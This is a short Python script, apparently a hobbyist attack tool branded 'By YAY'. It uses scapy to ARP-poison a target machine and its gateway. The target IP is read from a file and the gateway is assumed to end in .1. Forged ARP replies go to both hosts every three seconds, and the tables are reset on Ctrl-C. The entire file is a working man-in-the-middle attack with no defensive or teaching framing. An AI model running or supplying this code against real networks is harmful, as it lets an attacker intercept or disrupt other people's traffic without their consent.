import scapy.all as scapy
import time
import subprocess
import os

def poison(ip1, ip2, target_mac):
    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2)
    eth_packet = scapy.Ether(dst=target_mac)
    packet = eth_packet / arp_response
    scapy.sendp(packet, verbose=False)

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_packet
    answer = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    if answer:
        return answer[0][1].hwsrc
    else:
        return None

def reset_operation(ip1, ip2, target_mac, host_mac):
    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2, hwsrc=host_mac)
    scapy.send(arp_response, verbose=False, count=6)

def host_ip(ip_address):
    octets = ip_address.split('.')
    host_ip = f"{octets[0]}.{octets[1]}.{octets[2]}.1"
    return host_ip

try:
    yellow = "\033[33m"
    reset = "\033[0m"
    green = "\033[32m"
    red = "\033[31m"

    os.system("clear")
    string = f"{red}≿━━━━━━━━━━━━━━━━━━━━━━━━━━༺❀{reset} By YAY {red}❀༻━━━━━━━━━━━━━━━━━━━━━━━━━━≾{reset}"
    print(string)

    with open("Options/target_ip.txt", "r") as file:
        target_ip = file.read()
        
    host_ipaddress = host_ip(target_ip)

    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ipaddress)

    if not target_mac:
        print(f"{red}[!] Unable to retrieve MAC address for the target. Please check the target IP.{reset}")
        input()
        exit()

    i = 1
    try:
        while True:
            poison(target_ip, host_ipaddress, target_mac)
            poison(host_ipaddress, target_ip, host_mac)
            subprocess.call(["clear"])
            print(string)
            print(f"Sending packets: {i}")
            time.sleep(3)
            i += 1
    except KeyboardInterrupt:
        print("quiting & reset")
        reset_operation(target_ip, host_ipaddress, target_mac, host_mac)
        reset_operation(host_ipaddress, target_ip, host_mac, target_mac)
except KeyboardInterrupt:
    exit()
